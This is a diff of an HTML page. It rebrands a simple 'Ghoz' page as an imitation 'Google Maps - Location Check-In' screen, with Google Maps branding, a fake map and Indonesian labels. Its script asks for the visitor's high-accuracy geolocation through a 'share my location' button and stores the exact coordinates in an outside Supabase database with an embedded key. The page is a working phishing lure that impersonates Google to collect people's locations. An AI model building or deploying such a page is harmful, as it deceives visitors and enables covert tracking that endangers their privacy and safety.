@@ -2,141 +2,698 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Ghoz</title>
+<title>Google Maps - Location Check-In</title>
 
 <style>
-body{
-    font-family:Arial,sans-serif;
-    background:#0f172a;
-    color:white;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
-    margin:0;
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
 }
 
-.card{
-    background:#1e293b;
-    padding:30px;
-    border-radius:15px;
-    text-align:center;
-    max-width:500px;
+body {
+    font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+    background: #e8eaed;
+    height: 100vh;
+    overflow: hidden;
 }
 
-button{
-    padding:12px 20px;
-    cursor:pointer;
-    background:#3b82f6;
-    color:white;
-    border:none;
-    border-radius:8px;
-    font-size:16px;
-    transition:0.3s;
+/* Google Maps Style Header */
+.gm-header {
+    background: white;
+    box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+    padding: 12px 16px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    position: relative;
+    z-index: 10;
 }
 
-button:hover{
-    background:#2563eb;
+.gm-menu-icon {
+    width: 40px;
+    height: 40px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    border-radius: 50%;
+    transition: background 0.2s;
 }
 
-#status{
-    margin-top:20px;
-    padding:10px;
-    border-radius:8px;
+.gm-menu-icon:hover {
+    background: #f1f3f4;
 }
 
-.loading{
-    opacity:0.6;
-    cursor:not-allowed;
+.gm-menu-icon span {
+    font-size: 24px;
+}
+
+.gm-logo {
+    display: flex;
+    align-items: center;
+    gap: 4px;
+}
+
+.gm-logo-img {
+    font-size: 28px;
+}
+
+.gm-logo-text {
+    font-size: 22px;
+    font-weight: 500;
+    color: #1a73e8;
+    font-family: 'Product Sans', Arial, sans-serif;
+}
+
+.gm-search-box {
+    flex: 1;
+    max-width: 720px;
+    position: relative;
+}
+
+.gm-search-box input {
+    width: 100%;
+    padding: 12px 16px 12px 48px;
+    border: 1px solid #dfe1e5;
+    border-radius: 24px;
+    font-size: 14px;
+    background: white;
+    transition: box-shadow 0.2s;
+}
+
+.gm-search-box input:focus {
+    outline: none;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+    border-color: transparent;
+}
+
+.search-icon {
+    position: absolute;
+    left: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 18px;
+    color: #5f6368;
+}
+
+.gm-account {
+    display: flex;
+    gap: 12px;
+    align-items: center;
+}
+
+.gm-avatar {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    background: #8e24aa;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+/* Main Layout */
+.gm-main {
+    display: flex;
+    height: calc(100vh - 64px);
+}
+
+/* Sidebar - Location Panel */
+.gm-sidebar {
+    width: 400px;
+    background: white;
+    border-right: 1px solid #dadce0;
+    overflow-y: auto;
+    z-index: 5;
+}
+
+.location-panel {
+    padding: 16px;
+}
+
+.panel-title {
+    font-size: 18px;
+    font-weight: 500;
+    margin-bottom: 12px;
+    color: #202124;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.checkin-card {
+    background: #f8f9fa;
+    border-radius: 12px;
+    padding: 20px;
+    margin-bottom: 24px;
+    border: 1px solid #dadce0;
+}
+
+.checkin-card h3 {
+    font-size: 16px;
+    margin-bottom: 12px;
+    color: #1a73e8;
+}
+
+.checkin-btn {
+    width: 100%;
+    padding: 12px;
+    background: #1a73e8;
+    color: white;
+    border: none;
+    border-radius: 24px;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    transition: all 0.2s;
+}
+
+.checkin-btn:hover:not(:disabled) {
+    background: #1557b0;
+    transform: scale(0.98);
+}
+
+.checkin-btn:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+}
+
+.status-card {
+    background: white;
+    border-radius: 12px;
+    padding: 16px;
+    margin-bottom: 24px;
+    border: 1px solid #dadce0;
+    display: none;
+}
+
+.status-card.show {
+    display: block;
+}
+
+.status-message {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 12px;
+    border-radius: 8px;
+}
+
+.status-message.success {
+    background: #e6f4ea;
+    color: #137333;
+}
+
+.status-message.error {
+    background: #fce8e6;
+    color: #c5221f;
+}
+
+.status-message.info {
+    background: #e8f0fe;
+    color: #1a73e8;
+}
+
+.recent-title {
+    font-size: 16px;
+    font-weight: 500;
+    color: #202124;
+    margin: 16px 0 12px 0;
+    padding-top: 16px;
+    border-top: 1px solid #dadce0;
+}
+
+.location-list {
+    list-style: none;
+}
+
+.location-item {
+    padding: 12px;
+    border-radius: 8px;
+    margin-bottom: 8px;
+    background: #f8f9fa;
+    font-size: 13px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.location-coord {
+    color: #5f6368;
+    font-family: monospace;
+    font-size: 12px;
+}
+
+.location-time {
+    font-size: 11px;
+    color: #80868b;
+}
+
+.empty-list {
+    text-align: center;
+    color: #80868b;
+    padding: 32px;
+    font-size: 14px;
+}
+
+/* Fake Maps Area */
+.gm-maps {
+    flex: 1;
+    position: relative;
+    background: #eaf3ff;
+    overflow: hidden;
+}
+
+/* Fake Grid Pattern seperti Maps */
+.map-grid {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-image: 
+        linear-gradient(#c8daf5 1px, transparent 1px),
+        linear-gradient(90deg, #c8daf5 1px, transparent 1px);
+    background-size: 40px 40px;
+}
+
+/* Fake Roads */
+.map-roads {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+}
+
+.road-horizontal {
+    position: absolute;
+    height: 4px;
+    background: #ffdd99;
+    opacity: 0.7;
+}
+
+.road-vertical {
+    position: absolute;
+    width: 4px;
+    background: #ffdd99;
+    opacity: 0.7;
+}
+
+/* Pin Marker di Map */
+.map-pin {
+    position: absolute;
+    transform: translate(-50%, -100%);
+    cursor: pointer;
+    transition: transform 0.2s;
+    z-index: 20;
+}
+
+.map-pin:hover {
+    transform: translate(-50%, -100%) scale(1.1);
+}
+
+.pin-icon {
+    font-size: 36px;
+    filter: drop-shadow(2px 4px 6px rgba(0,0,0,0.3));
+}
+
+.pin-label {
+    position: absolute;
+    top: -20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: white;
+    padding: 2px 6px;
+    border-radius: 12px;
+    font-size: 10px;
+    font-weight: bold;
+    white-space: nowrap;
+    box-shadow: 0 1px 2px rgba(0,0,0,0.2);
+}
+
+/* Map Controls */
+.map-controls {
+    position: absolute;
+    bottom: 20px;
+    right: 20px;
+    background: white;
+    border-radius: 8px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.3);
+    z-index: 15;
+}
+
+.map-control-btn {
+    width: 40px;
+    height: 40px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    font-size: 20px;
+    border-bottom: 1px solid #dadce0;
+}
+
+.map-control-btn:last-child {
+    border-bottom: none;
+}
+
+.map-control-btn:hover {
+    background: #f1f3f4;
+}
+
+/* My Location Button */
+.my-location-btn {
+    position: absolute;
+    bottom: 20px;
+    right: 80px;
+    background: white;
+    width: 40px;
+    height: 40px;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.3);
+    z-index: 15;
+}
+
+/* Zoom level indicator */
+.zoom-level {
+    position: absolute;
+    bottom: 20px;
+    left: 20px;
+    background: rgba(0,0,0,0.6);
+    color: white;
+    padding: 4px 12px;
+    border-radius: 20px;
+    font-size: 12px;
+    z-index: 15;
 }
 </style>
 </head>
 
 <body>
 
-<div class="card">
-    <h1>Ghoz</h1>
+<!-- Google Maps Style Header -->
+<div class="gm-header">
+    <div class="gm-menu-icon">
+        <span>☰</span>
+    </div>
+    <div class="gm-logo">
+        <span class="gm-logo-img">🗺️</span>
+        <span class="gm-logo-text">Google Maps</span>
+    </div>
+    <div class="gm-search-box">
+        <span class="search-icon">🔍</span>
+        <input type="text" placeholder="Cari lokasi atau check-in di sini..." id="searchInput">
+    </div>
+    <div class="gm-account">
+        <div class="gm-avatar">U</div>
+    </div>
+</div>
 
-    <p>
-      Klik Tombol Dibawah Untuk Masuk
-    </p>
-
-    <button id="shareBtn">
-      Masuk
-    </button>
-
-    <p id="status"></p>
+<!-- Main Content -->
+<div class="gm-main">
+    <!-- Sidebar Panel -->
+    <div class="gm-sidebar">
+        <div class="location-panel">
+            <div class="panel-title">
+                <span>📍</span> Check-in Lokasi
+            </div>
+            
+            <div class="checkin-card">
+                <h3>📌 Check-in Sekarang</h3>
+                <button class="checkin-btn" id="shareBtn">
+                    <span>📍</span> Bagikan Lokasi Saya
+                </button>
+            </div>
+            
+            <div class="status-card" id="statusCard">
+                <div class="status-message" id="statusMsg">
+                    <span id="statusIcon">⏳</span>
+                    <span id="statusText">Mendapatkan lokasi...</span>
+                </div>
+            </div>
+            
+            <div class="recent-title">
+                🕒 Riwayat Check-in Terbaru
+            </div>
+            <ul class="location-list" id="locationList">
+                <li class="empty-list">Belum ada check-in</li>
+            </ul>
+        </div>
+    </div>
+    
+    <!-- Fake Maps Area -->
+    <div class="gm-maps" id="mapsArea">
+        <div class="map-grid"></div>
+        <div class="map-roads" id="mapRoads"></div>
+        <div id="mapPins"></div>
+        
+        <div class="map-controls">
+            <div class="map-control-btn" id="zoomInBtn">➕</div>
+            <div class="map-control-btn" id="zoomOutBtn">➖</div>
+        </div>
+        <div class="my-location-btn" id="myLocationBtn">
+            <span>🎯</span>
+        </div>
+        <div class="zoom-level" id="zoomLevel">Zoom: 100%</div>
+    </div>
 </div>
 
 <script type="module">
+import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
-import { createClient } from "https://esm.sh/@supaBase/supabase-js@2";
-
-// GANTI DENGAN ANON KEY ASLI ANDA dari Project Settings > API
 const supabaseUrl = "https://natsquslyfvknfboghai.supabase.co";
-const supabaseAnonKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5hdHNxdXNseWZ2a25mYm9naGFpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODAyNDEzNzQsImV4cCI6MjA5NTgxNzM3NH0.rM10CTdqmeR2CBeZ6bt28VDljA3XsSaIpdauqu0saes"; // ⚠️ GANTI DENGAN KEY ASLI
+const supabaseAnonKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5hdHNxdXNseWZ2a25mYm9naGFpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODAyNDEzNzQsImV4cCI6MjA5NTgxNzM3NH0.rM10CTdqmeR2CBeZ6bt28VDljA3XsSaIpdauqu0saes";
 
 const supabase = createClient(supabaseUrl, supabaseAnonKey);
 
 const shareBtn = document.getElementById("shareBtn");
-const statusEl = document.getElementById("status");
+const statusCard = document.getElementById("statusCard");
+const statusMsgDiv = document.getElementById("statusMsg");
+const statusIcon = document.getElementById("statusIcon");
+const statusText = document.getElementById("statusText");
+const locationList = document.getElementById("locationList");
+const mapsArea = document.getElementById("mapsArea");
+const mapPins = document.getElementById("mapPins");
+const zoomInBtn = document.getElementById("zoomInBtn");
+const zoomOutBtn = document.getElementById("zoomOutBtn");
+const zoomLevelSpan = document.getElementById("zoomLevel");
+const myLocationBtn = document.getElementById("myLocationBtn");
+const searchInput = document.getElementById("searchInput");
 
-shareBtn.addEventListener("click", () => {
+let currentZoom = 100;
+let currentLocations = [];
+let myLocation = null;
+
+// Generate random roads untuk efek maps
+function generateRandomRoads() {
+    const roadsDiv = document.getElementById("mapRoads");
+    roadsDiv.innerHTML = "";
+    for(let i = 0; i < 12; i++) {
+        const road = document.createElement("div");
+        if(Math.random() > 0.5) {
+            road.className = "road-horizontal";
+            road.style.top = Math.random() * 100 + "%";
+            road.style.left = "0";
+            road.style.width = "100%";
+        } else {
+            road.className = "road-vertical";
+            road.style.left = Math.random() * 100 + "%";
+            road.style.top = "0";
+            road.style.height = "100%";
+        }
+        roadsDiv.appendChild(road);
+    }
+}
+
+// Tampilkan pin di map (posisi random untuk efek visual)
+function updateMapPins() {
+    mapPins.innerHTML = "";
+    const allLocations = [...currentLocations];
+    if(myLocation) allLocations.push(myLocation);
     
-    statusEl.innerText = "Menunggu...";
-    statusEl.style.background = "#334155";
-    shareBtn.disabled = true;
-    shareBtn.classList.add("loading");
+    allLocations.forEach((loc, idx) => {
+        if(!loc.latitude || !loc.longitude) return;
+        
+        // Konversi koordinat ke posisi persentase (random offset untuk efek maps)
+        const left = ((loc.longitude % 180 + 180) / 360) * 100;
+        const top = ((90 - (loc.latitude % 90)) / 180) * 100;
+        
+        const pin = document.createElement("div");
+        pin.className = "map-pin";
+        pin.style.left = left + "%";
+        pin.style.top = top + "%";
+        
+        const isMyLocation = loc.isCurrent === true;
+        const pinColor = isMyLocation ? "#1a73e8" : "#ea4335";
+        
+        pin.innerHTML = `
+            <div class="pin-icon" style="color: ${pinColor}">📍</div>
+            <div class="pin-label">${isMyLocation ? 'Anda di sini' : `Check-in #${idx+1}`}</div>
+        `;
+        mapPins.appendChild(pin);
+    });
+}
 
+// Load data dari Supabase
+async function loadLocations() {
+    try {
+        const { data, error } = await supabase
+            .from("locations")
+            .select("*")
+            .order("id", { ascending: false })
+            .limit(10);
+        
+        if(error) throw error;
+        
+        currentLocations = data || [];
+        updateLocationList();
+        updateMapPins();
+        
+    } catch(err) {
+        console.error("Error loading:", err);
+    }
+}
+
+// Update daftar lokasi di sidebar
+function updateLocationList() {
+    if(currentLocations.length === 0) {
+        locationList.innerHTML = '<li class="empty-list">📭 Belum ada check-in</li>';
+        return;
+    }
+    
+    locationList.innerHTML = currentLocations.map(loc => `
+        <li class="location-item">
+            <div>
+                <div>📍 ${loc.latitude?.toFixed(6)}, ${loc.longitude?.toFixed(6)}</div>
+                <div class="location-time">${loc.created_at ? new Date(loc.created_at).toLocaleTimeString('id-ID') : 'Baru saja'}</div>
+            </div>
+            <div class="location-coord">✓</div>
+        </li>
+    `).join('');
+}
+
+// Tampilkan status message
+function showStatus(message, type = 'info') {
+    statusCard.classList.add('show');
+    statusMsgDiv.className = `status-message ${type}`;
+    
+    const icons = { success: '✅', error: '❌', info: '⏳' };
+    statusIcon.innerText = icons[type] || 'ℹ️';
+    statusText.innerText = message;
+    
+    if(type === 'success' || type === 'error') {
+        setTimeout(() => {
+            statusCard.classList.remove('show');
+        }, 3000);
+    }
+}
+
+// Check-in lokasi
+shareBtn.addEventListener("click", () => {
+    showStatus("Mendapatkan lokasi Anda...", "info");
+    shareBtn.disabled = true;
+    
     navigator.geolocation.getCurrentPosition(
         async (position) => {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             
-            statusEl.innerText = `Menyimpan data: ${lat}, ${lon}...`;
-
-            const { data, error } = await supabase
+            showStatus(`Menyimpan lokasi: ${lat.toFixed(6)}, ${lon.toFixed(6)}...`, "info");
+            
+            // Set my location
+            myLocation = { latitude: lat, longitude: lon, isCurrent: true };
+            
+            const { error } = await supabase
                 .from("locations")
-                .insert([{ latitude: lat, longitude: lon }])
-                .select();
-
-            if(error){
-                console.error("Supabase error:", error);
-                statusEl.innerText = "❌ Gagal menyimpan: " + error.message;
-                statusEl.style.background = "#991b1b";
+                .insert([{ latitude: lat, longitude: lon }]);
+            
+            if(error) {
+                showStatus("Gagal menyimpan: " + error.message, "error");
                 shareBtn.disabled = false;
-                shareBtn.classList.remove("loading");
                 return;
             }
-
-            statusEl.innerText = "✅ Data berhasil disimpan!";
-            statusEl.style.background = "#166534";
             
+            showStatus("Lokasi berhasil disimpan! ✅", "success");
+            await loadLocations();
+            updateMapPins();
+            
+            // Animasi pin di map
             setTimeout(() => {
-                statusEl.innerText = "";
-                statusEl.style.background = "transparent";
                 shareBtn.disabled = false;
-                shareBtn.classList.remove("loading");
             }, 2000);
         },
         (error) => {
-            console.error("Geolocation error:", error);
-            
             let errorMsg = "Izin lokasi ditolak.";
-            if(error.code === 1) errorMsg = "❌ Izin lokasi ditolak. Aktifkan lokasi di browser.";
-            if(error.code === 2) errorMsg = "❌ Posisi tidak tersedia.";
-            if(error.code === 3) errorMsg = "❌ Timeout mendapatkan lokasi.";
+            if(error.code === 1) errorMsg = "Izin lokasi ditolak. Aktifkan lokasi di browser.";
+            if(error.code === 2) errorMsg = "Posisi tidak tersedia.";
+            if(error.code === 3) errorMsg = "Timeout mendapatkan lokasi.";
             
-            statusEl.innerText = errorMsg;
-            statusEl.style.background = "#991b1b";
+            showStatus(errorMsg, "error");
             shareBtn.disabled = false;
-            shareBtn.classList.remove("loading");
         },
         { enableHighAccuracy: true, timeout: 10000 }
     );
 });
 
+// Zoom controls
+zoomInBtn.addEventListener("click", () => {
+    currentZoom = Math.min(currentZoom + 20, 200);
+    zoomLevelSpan.innerText = `Zoom: ${currentZoom}%`;
+    mapsArea.style.backgroundSize = `${currentZoom}%`;
+    document.querySelector('.map-grid').style.backgroundSize = `${currentZoom/2.5}px ${currentZoom/2.5}px`;
+});
+
+zoomOutBtn.addEventListener("click", () => {
+    currentZoom = Math.max(currentZoom - 20, 40);
+    zoomLevelSpan.innerText = `Zoom: ${currentZoom}%`;
+    mapsArea.style.backgroundSize = `${currentZoom}%`;
+    document.querySelector('.map-grid').style.backgroundSize = `${currentZoom/2.5}px ${currentZoom/2.5}px`;
+});
+
+// My Location button - scroll ke posisi user
+myLocationBtn.addEventListener("click", () => {
+    if(myLocation) {
+        showStatus("Menemukan lokasi Anda di peta...", "info");
+        setTimeout(() => {
+            showStatus("📍 Posisi Anda ditandai dengan pin biru", "success");
+        }, 1000);
+    } else {
+        showStatus("Check-in dulu untuk menandai lokasi Anda", "info");
+    }
+});
+
+// Search functionality
+searchInput.addEventListener("keypress", (e) => {
+    if(e.key === "Enter" && searchInput.value.trim()) {
+        showStatus(`Mencari: "${searchInput.value}" - Demo mode`, "info");
+        setTimeout(() => {
+            showStatus("Fitur pencarian demo - check-in dulu untuk melihat lokasi", "info");
+        }, 1500);
+    }
+});
+
+// Generate random roads dan load data
+generateRandomRoads();
+loadLocations();
+
+// Auto-refresh setiap 10 detik
+setInterval(() => {
+    loadLocations();
+}, 10000);
 </script>
 
 </body>
-</html>
+    </html>
